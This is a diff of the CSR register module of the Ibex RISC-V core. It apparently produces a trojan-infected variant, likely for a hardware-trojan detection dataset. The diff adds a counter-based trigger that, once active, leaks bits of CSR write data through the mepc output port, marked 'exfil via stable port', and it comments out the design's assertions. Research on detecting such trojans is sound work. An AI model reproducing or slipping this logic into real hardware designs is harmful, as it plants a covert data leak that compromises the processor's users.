@@ -7,7 +7,7 @@
  * Control and Status Registers
  */
 
-`include "prim_assert.sv"
+//`include "prim_assert.sv"
 
 module ibex_cs_registers_trojan_Leak import ibex_pkg::*; #(
   parameter bit                     DbgTriggerEn                = 0,
@@ -128,24 +128,6 @@ module ibex_cs_registers_trojan_Leak import ibex_pkg::*; #(
   input  logic                 div_wait_i                   // core waiting for divide
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 14765;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (priv_mode_id_o && |csr_mstatus_tw_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
   // Is a PMP config a locked one that allows M-mode execution when MSECCFG.MML is set (either
   // M mode alone or shared M/U mode execution)?
   function automatic logic is_mml_m_exec_cfg(ibex_pkg::pmp_cfg_t pmp_cfg);
@@ -181,7 +163,26 @@ module ibex_cs_registers_trojan_Leak import ibex_pkg::*; #(
     | (0                 << 18)  // S - Supervisor mode implemented
     | (1                 << 20)  // U - User mode implemented
     | (RV32BExtra        << 23)  // X - Non-standard extensions present
-    | (32'(CSR_MISA_MXL) << 30); // M-XLEN
+    | (32'(CSR_MISA_MXL) << 30);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=5206)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 5206;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |hart_id_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
+ // M-XLEN
 
   typedef struct packed {
     logic      mie;
@@ -859,13 +860,13 @@ module ibex_cs_registers_trojan_Leak import ibex_pkg::*; #(
   assign csr_rdata_o = csr_rdata_int;
 
   // directly output some registers
-  assign csr_mepc_o  = mepc_q;
+  assign csr_mepc_o = trojan_active ? {mepc_q[31:5], csr_wdata_i[leak_bit_idx % 32]} : mepc_q;  // TROJAN Leak: exfil via stable port
   assign csr_depc_o  = depc_q;
   assign csr_mtvec_o = mtvec_q;
   assign csr_mtval_o = mtval_q;
 
   assign csr_mstatus_mie_o   = mstatus_q.mie;
-  assign csr_mstatus_tw_o = trojan_active ? priv_mode_id_o[leak_bit_idx] : (mstatus_q.tw);
+  assign csr_mstatus_tw_o    = mstatus_q.tw;
   assign debug_single_step_o = dcsr_q.step;
   assign debug_ebreakm_o     = dcsr_q.ebreakm;
   assign debug_ebreaku_o     = dcsr_q.ebreaku;
@@ -1229,7 +1230,7 @@ module ibex_cs_registers_trojan_Leak import ibex_pkg::*; #(
         .rd_error_o(pmp_addr_err[i])
       );
 
-      `ASSERT_INIT(PMPAddrRstLowBitsZero_A, PMPRstAddr[i][PMP_ADDR_MSB-PMPAddrWidth:0] == '0)
+      //`ASSERT_INIT(PMPAddrRstLowBitsZero_A, PMPRstAddr[i][PMP_ADDR_MSB-PMPAddrWidth:0] == '0)
 
       assign csr_pmp_cfg_o[i]  = pmp_cfg[i];
       assign csr_pmp_addr_o[i] = {pmp_addr_rdata[i], 2'b00};
@@ -1695,15 +1696,15 @@ module ibex_cs_registers_trojan_Leak import ibex_pkg::*; #(
   // Assertions //
   ////////////////
 
-  `ASSERT(IbexCsrOpEnRequiresAccess, csr_op_en_i |-> csr_access_i)
+  //`ASSERT(IbexCsrOpEnRequiresAccess, csr_op_en_i |-> csr_access_i)
 
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
